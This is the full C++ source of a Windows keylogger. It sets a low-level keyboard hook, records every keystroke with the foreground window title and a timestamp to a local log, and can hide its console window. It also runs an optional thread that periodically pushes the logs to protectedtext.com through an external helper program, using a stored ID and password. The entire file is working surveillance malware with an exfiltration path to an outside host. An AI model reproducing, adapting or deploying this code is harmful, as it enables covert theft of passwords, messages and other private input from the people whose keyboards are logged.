#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <unordered_map>
#include <thread>
#include <assert.h>

/*
 *
 * Config
 * 
 */

#define KLGR_PROMPT
// #define KLGR_HIDE_WINDOW

// Static
// #define KLGR_S_CLEAR_LOG_FILE
// #define KLGR_S_USE_PROTECTEDTEXT
// #define KLGR_S_PROTECTEDTEXT_ID "id-here"
// #define KLGR_S_PROTECTEDTEXT_PWD "pwd-here"
// #define KLGR_S_PROTECTEDTEXT_DELAY 5000

/*
 *
 * Defines
 *
 */

#define KLGR_OUT_FN "klgr.log" // output logs filename

#define KLGR_VIS_KEYNAME "PG_UP"
#define KLGR_VIS_VK       VK_PRIOR // key to switch window visibility
#define KLGR_VIS_HOLD     3        // time (in sec) to hold the KLGR_VIS_VK key to switch window visibility

#define KLGR_EXIT_KEYNAME "PG_DN"
#define KLGR_EXIT_VK       VK_NEXT // key to exit
#define KLGR_EXIT_HOLD     3       // time (in sec) to hold the KLGR_EXIT_VK key to exit

#define KLGR_PROTECTEDTEXT_DELAY_MIN 5000 // min protectedtext update delay that the user can enter (in ms)
#define KLGR_PROTECTEDTEXT_CALL "\".\\protected-text.exe\"" // system call to update protectedtext logs
#define KLGR_PROTECTEDTEXT_IDPWD_FN "protected-text-idpwd.txt" // name of the file that stores protectedtext ID & password

/*
 *
 * Globals
 * 
 */

static std::ofstream G_output_file;
static bool G_use_protectedtext;
static DWORD G_protectedtext_update_delay;
static HWND G_window = NULL;
static HHOOK G_hook = NULL;
static const std::unordered_map<DWORD, const char*> G_special_key_names { 
	{VK_BACK,       "BACKSPACE" },
	{VK_RETURN,	    "ENTER"     },
	{VK_TAB,	    "TAB"       },
	{VK_SHIFT,	    "SHIFT"     },
	{VK_LSHIFT,	    "LSHIFT"    },
	{VK_RSHIFT,	    "RSHIFT"    },
	{VK_CONTROL,	"CONTROL"   },
	{VK_LCONTROL,	"LCONTROL"  },
	{VK_RCONTROL,	"RCONTROL"  },
	{VK_MENU,	    "ALT"       },
	{VK_LWIN,	    "LWIN"      },
	{VK_RWIN,	    "RWIN"      },
	{VK_ESCAPE,	    "ESCAPE"    },
	{VK_END,	    "END"       },
	{VK_HOME,	    "HOME"      },
	{VK_LEFT,	    "LEFT"      },
	{VK_RIGHT,	    "RIGHT"     },
	{VK_UP,		    "UP"        },
	{VK_DOWN,	    "DOWN"      },
	{VK_PRIOR,	    "PG_UP"     },
	{VK_NEXT,	    "PG_DOWN"   },
	{VK_CAPITAL,	"CAPSLOCK"  },
};

/*
 *
 *
 * 
 */

static inline std::ostream& klgr_cout_info () {
    return std::cout << "| ";
}

static inline std::ostream& klgr_cout_warn () {
    return std::cout << "# ";
}

/*
 *
 *
 * 
 */

static void klgr_send (DWORD vkCode, bool down) {
	static char last_window_title[256] = "";
    static DWORD prev_special_key = 0;
    static time_t vis_hold_start = 0;
    static time_t exit_hold_start = 0;

	std::string output;
    HWND fg_window = GetForegroundWindow();
    HKL kb_layout = NULL;

    if (fg_window != NULL) {
        kb_layout = GetKeyboardLayout(GetWindowThreadProcessId(fg_window, NULL));

        char fg_window_title[256]; // current window title
        GetWindowTextA(fg_window, (LPSTR)fg_window_title, 256);

        // last window title is not the current window title
        if (strcmp(fg_window_title, last_window_title) != 0)
        {
            // update last window title
            strcpy(last_window_title, fg_window_title);

            // format current time
            time_t t = time(NULL);
            struct tm tm;
            localtime_s(&tm, &t);
            char time_str[64];
            strftime(time_str, sizeof(time_str), "%c", &tm);

            output += "\n[Window: ";
            output += fg_window_title;
            output += " - ";
            output += time_str;
            output += ']';
        }
    }

    // switch visibilty key
    if (vkCode == KLGR_VIS_VK)
    if (down) {
        if (vis_hold_start == 0)
            vis_hold_start = time(NULL);
        if (time(NULL) - vis_hold_start >= KLGR_VIS_HOLD) {
            ShowWindow(G_window, !IsWindowVisible(G_window));
            vis_hold_start = 0;
        }
    }

    // exit key
    if (vkCode == KLGR_EXIT_VK)
    if (down) {
        if (exit_hold_start == 0)
            exit_hold_start = time(NULL);
        if (time(NULL) - exit_hold_start >= KLGR_EXIT_HOLD) {
            exit(0);
            exit_hold_start = 0;
        }
    }

    // special key
	if (G_special_key_names.find(vkCode) != G_special_key_names.end()) {
        if (prev_special_key != vkCode) { // dont spam when holding the key
            output += "[";
            output += G_special_key_names.at(vkCode);
            output += (down ? '+' : '-');
            output += ']';
            if (vkCode == VK_RETURN) // new-line on pushed ENTER
            if (down)
                output += '\n';
            prev_special_key = vkCode;
        }
    }
    // normal key pressed down
	else if (down) {
        prev_special_key = 0;
		bool lowercase = !(GetKeyState(VK_CAPITAL) & 0x0001); // caps lock

		if ( // shift
            (GetKeyState(VK_SHIFT)  & 0x1000) ||
            (GetKeyState(VK_LSHIFT) & 0x1000) ||
			(GetKeyState(VK_RSHIFT) & 0x1000)
        ) lowercase = !lowercase;

		char key = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR, kb_layout);
		if (lowercase)
			key = tolower(key);

		output += key;
	}

	G_output_file << output;
	G_output_file.flush();
	std::cout << output;
}

/*
 *
 *
 * 
 */

LRESULT __stdcall klgr_hook_callback (int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
        bool down = (wParam == WM_KEYDOWN);
        bool up   = (wParam == WM_KEYUP);
		if (down || up)
			klgr_send(((KBDLLHOOKSTRUCT*)lParam)->vkCode, down);
	}
	return CallNextHookEx(G_hook, nCode, wParam, lParam);
}

/*
 *
 *
 * 
 */

static void klgr_protectedtext_thread () {
    if (!G_use_protectedtext) {
        klgr_cout_warn() << "protectedtext logging DISABLED";
        return;
    }
    klgr_cout_info() << "created protectedtext logging thread (delay " << G_protectedtext_update_delay << "ms)" << std::endl;
    for (;;) {
        Sleep(G_protectedtext_update_delay);
        system(KLGR_PROTECTEDTEXT_CALL);
    }
}

/*
 *
 *
 * 
 */

static bool klgr_prompt_bool (const std::string &prompt) {
    bool b = true;
    std::cin.clear();
    std::cin.sync();
    for (;;) {
        std::string s;
        klgr_cout_info() << prompt << " (y/n): ";
        std::getline(std::cin, s);
        if (s.empty()) break;
        if (s[0] == 'y') { b = true;  break; }
        if (s[0] == 'n') { b = false; break; }
    }
    return b;
}

static std::string klgr_prompt_string (const std::string &prompt, const std::string &default_value = "") {
    std::string s;

    if (default_value.empty()) {
        klgr_cout_info() << prompt << ": ";
        std::cin >> s;
        return s;
    }

    klgr_cout_info() << prompt << " (" << default_value << "): ";
    std::cin.clear();
    std::cin.sync();
    std::getline(std::cin, s);
    if (s.empty())
        return default_value;
    return s;
}

int main () {
    /*
     *
     * Prompt
     * 
     */

    bool clear = false;
#ifdef KLGR_PROMPT
    clear = klgr_prompt_bool("clear log file \"" + std::string(KLGR_OUT_FN) + "\"?");
#elif defined(KLGR_S_CLEAR_LOG_FILE)
    clear = true;
#endif
    if (clear)
        G_output_file.open(KLGR_OUT_FN, std::ofstream::trunc);
    else
        G_output_file.open(KLGR_OUT_FN);
    if (!G_output_file.is_open()) {
        klgr_cout_warn() << "failed to open log file \"" << KLGR_OUT_FN << '"' << std::endl;
        return 0;
    }

    //
    // ProtectedText
    //
    G_use_protectedtext = false;
#ifdef KLGR_PROMPT
    G_use_protectedtext = klgr_prompt_bool("use protectedtext.com for additional logging?");
#elif defined(KLGR_S_USE_PROTECTEDTEXT)
    G_use_protectedtext = true;
#endif
    if (G_use_protectedtext) {
        std::string id, pwd;

#ifdef KLGR_PROMPT
        // retrieve previous ID and password
        std::string prev_id;
        std::string prev_pwd;
        {
            std::ifstream protectedtext_idpwd_f(KLGR_PROTECTEDTEXT_IDPWD_FN);
            if (protectedtext_idpwd_f.is_open()) {
                std::string idpwd;
                protectedtext_idpwd_f >> idpwd;
                size_t sep_idx = idpwd.find(',');
                if (sep_idx != std::string::npos) {
                    prev_id = idpwd.substr(0, sep_idx);
                    prev_pwd = idpwd.substr(sep_idx + 1);
                }
            }
        }
        // prompt ID, password and delay
        id = klgr_prompt_string("protectedtext ID", prev_id);
        pwd = klgr_prompt_string("protectedtext password", prev_pwd);
        do {
            std::string s;
            klgr_cout_info() << "protectedtext log update delay (min " << KLGR_PROTECTEDTEXT_DELAY_MIN << "ms): ";
            std::cin.clear();
            std::cin.sync();
            std::getline(std::cin, s);
            if (s.empty()) {
                G_protectedtext_update_delay = KLGR_PROTECTEDTEXT_DELAY_MIN;
                break;
            }
            G_protectedtext_update_delay = atoi(s.c_str());
        } while (G_protectedtext_update_delay < KLGR_PROTECTEDTEXT_DELAY_MIN);
#else
        id = KLGR_S_PROTECTEDTEXT_ID;
        pwd = KLGR_S_PROTECTEDTEXT_PWD;
        G_protectedtext_update_delay = KLGR_S_PROTECTEDTEXT_DELAY;
#endif

        // write new ID and password
        std::ofstream protectedtext_idpwd_f(KLGR_PROTECTEDTEXT_IDPWD_FN, std::ofstream::trunc);
        if (!protectedtext_idpwd_f.is_open()) {
            klgr_cout_warn() << "failed to open protectedtext idpwd file \"" << KLGR_PROTECTEDTEXT_IDPWD_FN << '"' << std::endl;
            return 0;
        }
        protectedtext_idpwd_f << id << ',' << pwd;
    }

    /*
     *
     *
     * 
     */

    // Get console window
    G_window = FindWindowA("ConsoleWindowClass", NULL);
    if (G_window == NULL) {
        klgr_cout_warn() << "couldn't find console window" << std::endl;
        return 0;
    }
    klgr_cout_info() << "found console window" << std::endl;
#ifdef KLGR_HIDE_WINDOW
    ShowWindow(G_window, 0);
#endif

    // Set hook
    G_hook = SetWindowsHookEx(WH_KEYBOARD_LL, klgr_hook_callback, NULL, 0);
	if (G_hook == NULL) {
        klgr_cout_warn() << "failed to set keyboard hook" << std::endl;
        return 0;
	}
    klgr_cout_info() << "set keyboard hook" << std::endl;

    klgr_cout_warn() << "hold [" << KLGR_VIS_KEYNAME  << "] for " << KLGR_VIS_HOLD  << "s to switch console visibility" << std::endl;
    klgr_cout_warn() << "hold [" << KLGR_EXIT_KEYNAME << "] for " << KLGR_EXIT_HOLD << "s to exit" << std::endl;
    klgr_cout_info() << "logging!" << std::endl;

    // Protectedtext logging thread
    // 'G_use_protectedtext' checked in 'klgr_protectedtext_thread'
    std::thread t(klgr_protectedtext_thread);

	// Infinite loop
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0));
}
